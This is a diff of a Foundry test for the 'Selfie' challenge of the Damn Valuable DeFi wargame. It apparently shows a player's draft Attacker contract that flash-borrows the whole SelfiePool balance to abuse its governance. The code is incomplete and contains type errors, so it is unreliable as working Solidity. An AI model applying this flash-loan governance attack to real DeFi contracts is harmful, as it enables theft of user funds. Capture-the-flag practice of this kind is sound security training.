@@ -6,19 +6,24 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
 
 contract Attacker is IERC3156FlashBorrower {
     SimpleGovernance public governance;
+    SelfiePool public pool;
+
     address public recovery;
     bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
     uint256 constant TOKENS_IN_POOL = 1_500_000e18;
 
-    constructor(SimpleGovernance _governance, address _recovery){
+    constructor(SimpleGovernance _governance, address _recovery, address _pool){
         governance = _governance;
         recovery = _recovery;
+        pool = _pool;
     }
 
-    function attack(pool SelfiePool, address token) external{
+    function attack(address token) external{
         pool.flashLoan(address(this),address(token),TOKENS_IN_POOL,"");
         console.log(token.balanceOf(address(this)));
     }
@@ -96,8 +101,8 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        Attacker attacker = new Attacker(address(governance),address(recovery));
-        attacker.attack(address(pool),address(token));
+        Attacker attacker = new Attacker(address(governance),address(recovery),address(pool));
+        attacker.attack(address(token));
     }
 
     /**
